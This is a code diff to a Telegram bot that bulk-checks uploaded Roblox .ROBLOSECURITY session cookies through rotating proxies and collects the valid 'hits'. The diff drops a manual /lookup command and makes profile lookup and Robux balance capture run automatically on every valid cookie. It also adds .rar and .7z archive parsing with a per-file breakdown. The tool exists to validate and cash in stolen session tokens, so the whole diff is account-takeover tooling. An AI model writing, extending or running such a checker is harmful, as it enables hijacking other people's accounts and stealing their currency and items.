@@ -21,7 +21,6 @@ from utils.helpers import sanitize_text
 from core.cookie_checker import CookieChecker, CheckResult
 from core.proxy_rotator import ProxyRotator
 from core.file_parser import FileParser
-from core.user_lookup import UserLookup
 from bot.sessions import SessionManager, SessionState
 
 logger = logging.getLogger(__name__)
@@ -45,16 +44,16 @@ Welcome, {update.effective_user.first_name}!
 
 📋 **Features:**
 • ✅ Fast & accurate cookie validation
-• 💰 Robux balance capture
-• ⭐ Premium status detection
-• 👤 Full user profile lookup
+• 💰 Robux balance capture (auto on valid)
+• ⭐ Premium status detection (auto on valid)
+• 👤 Full user profile lookup (auto on valid)
 • 🔄 Proxy rotation support
-• 📦 Multi-format file support (.txt, .zip, .json, .csv, etc.)
+• 📦 Multi-format file support (.txt, .zip, .rar, .7z, .json, .csv, etc.)
+• 📁 Per-file breakdown inside archives
 
 🚀 **Commands:**
 /start - Show this menu
 /check - Upload a file to check cookies
-/lookup <username> - Lookup a Roblox user
 /proxy - Set custom proxies
 /stats - Show your session stats
 /cancel - Cancel current check
@@ -62,13 +61,14 @@ Welcome, {update.effective_user.first_name}!
 📁 **Supported File Formats:**
 {FileParser.get_supported_extensions_str()}
 
+🔐 **User lookup runs automatically** on valid cookies — no separate command needed!
+
 🔒 **Privacy:** Your cookies are processed securely and never stored.
 
 Ready to check? Send me a file with cookies!
 """
     keyboard = [
         [InlineKeyboardButton("📁 Upload File", callback_data="upload_file")],
-        [InlineKeyboardButton("🔍 Lookup User", callback_data="lookup_user")],
         [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -98,7 +98,12 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 Please upload a file containing Roblox cookies.
 
-**Supported formats:** .txt, .zip, .json, .csv, .tsv, .log, and more
+**Supported formats:** .txt, .zip, .rar, .7z, .json, .csv, .tsv, .log, and more
+
+**Archive files (.zip, .rar, .7z):**
+• Each file inside the archive is checked individually
+• Supports nested archives (zip inside zip)
+• You'll see a per-file breakdown
 
 **Cookie formats accepted:**
 • Plain .ROBLOSECURITY value
@@ -106,6 +111,8 @@ Please upload a file containing Roblox cookies.
 • cookie:.ROBLOSECURITY=cookie_value
 • JSON: {"cookie": "value"}
 • And many more!
+
+**User lookup + Robux capture runs automatically** on every valid cookie found.
 
 Max file size: 50MB
 """
@@ -151,7 +158,7 @@ async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await update.message.reply_text("🔍 Parsing cookies from file...")
 
     try:
-        cookies = FileParser.parse_file(filepath)
+        cookies, breakdown = FileParser.parse_file(filepath)
         os.remove(filepath)
         os.rmdir(temp_dir)
     except Exception as e:
@@ -162,6 +169,20 @@ async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if not cookies:
         await update.message.reply_text("❌ No valid cookies found in the file.")
         return
+
+    # Show per-file breakdown for archives
+    if breakdown and len(breakdown) > 1:
+        breakdown_lines = ["📂 **Per-File Breakdown:**"]
+        for item in breakdown:
+            fname = item.get("filename", "unknown")
+            count = item.get("cookies", 0)
+            note = item.get("note", "")
+            line = f"  • {fname}: {count} cookies"
+            if note:
+                line += f" ({note})"
+            breakdown_lines.append(line)
+        breakdown_lines.append(f"\n🟢 **Total: {len(cookies)} unique cookies**")
+        await update.message.reply_text("\n".join(breakdown_lines), parse_mode=ParseMode.MARKDOWN)
 
     # Start checking
     await start_check(update, context, user_id, chat_id, cookies)
@@ -198,6 +219,7 @@ async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE,
 📦 Total Cookies: {len(cookies)}
 🔄 Proxies: {proxy_rotator.alive_count}/{proxy_rotator.total_count}
 ⚡ Concurrency: {Config.MAX_CONCURRENT}
+👤 User lookup + Robux capture: **AUTO on valid**
 
 Checking...
 """
@@ -278,7 +300,7 @@ async def update_progress(update: Update, context: ContextTypes.DEFAULT_TYPE,
             parse_mode=ParseMode.MARKDOWN,
         )
     except Exception:
-        pass  # Message might be too old or deleted
+        pass
 
 
 async def send_final_results(update: Update, context: ContextTypes.DEFAULT_TYPE,
@@ -339,49 +361,6 @@ async def send_final_results(update: Update, context: ContextTypes.DEFAULT_TYPE,
         os.unlink(temp_hits)
 
 
-async def lookup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /lookup command."""
-    if not context.args:
-        await update.message.reply_text(
-            "Usage: /lookup <username>\n\nExample: /lookup RobloxUser123"
-        )
-        return
-
-    username = context.args[0]
-    await update.message.reply_text(f"🔍 Looking up @{username}...")
-
-    proxy_rotator = ProxyRotator()
-    await proxy_rotator.load_proxies()
-
-    connector = aiohttp.TCPConnector(limit=10)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        proxy = await proxy_rotator.get_proxy()
-        user_info = await UserLookup.lookup_by_username(session, username, proxy)
-
-    if not user_info:
-        await update.message.reply_text(f"❌ User '@{username}' not found.")
-        return
-
-    # Format result
-    lines = [
-        f"👤 **{user_info.get('display_name', username)}** (@{user_info.get('username', username)})",
-        f"",
-        f"🆔 ID: {user_info.get('user_id', 'N/A')}",
-        f"🔗 https://www.roblox.com/users/{user_info.get('user_id', 'N/A')}/profile",
-        f"",
-        f"📅 Joined: {user_info.get('join_date', 'Unknown')} ({user_info.get('age_days', 0)} days)",
-        f"👥 Friends: {user_info.get('friends_count', 0):,} | Followers: {user_info.get('followers_count', 0):,}",
-        f"🏠 Groups: {user_info.get('groups_count', 0)} | 🏅 Badges: {user_info.get('badges_count', 0)}",
-        f"💎 Collectibles: {user_info.get('collectible_count', 0)} | Limiteds: {user_info.get('limited_count', 0)}",
-    ]
-
-    if user_info.get('description'):
-        lines.append(f"")
-        lines.append(f"📝 {user_info.get('description')}")
-
-    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)
-
-
 async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /proxy command."""
     user_id = update.effective_user.id
@@ -422,7 +401,6 @@ async def handle_proxy_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
     proxy_rotator = ProxyRotator()
 
     if update.message.document:
-        # Handle proxy file
         document = update.message.document
         await update.message.reply_text("📥 Downloading proxy file...")
 
@@ -440,7 +418,6 @@ async def handle_proxy_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
             await update.message.reply_text("❌ Failed to load proxy file.")
             return
     else:
-        # Handle proxy text
         text = update.message.text
         count = proxy_rotator.load_proxies_from_string(text)
 
@@ -504,10 +481,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if query.data == "upload_file":
         await check_command(update, context)
-    elif query.data == "lookup_user":
-        await update.message.reply_text(
-            "Use /lookup <username> to lookup a user.\n\nExample: /lookup RobloxUser123"
-        )
     elif query.data == "settings":
         await proxy_command(update, context)
 
@@ -516,7 +489,6 @@ def register_handlers(application: Application):
     """Register all bot handlers."""
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("check", check_command))
-    application.add_handler(CommandHandler("lookup", lookup_command))
     application.add_handler(CommandHandler("proxy", proxy_command))
     application.add_handler(CommandHandler("stats", stats_command))
     application.add_handler(CommandHandler("cancel", cancel_command))
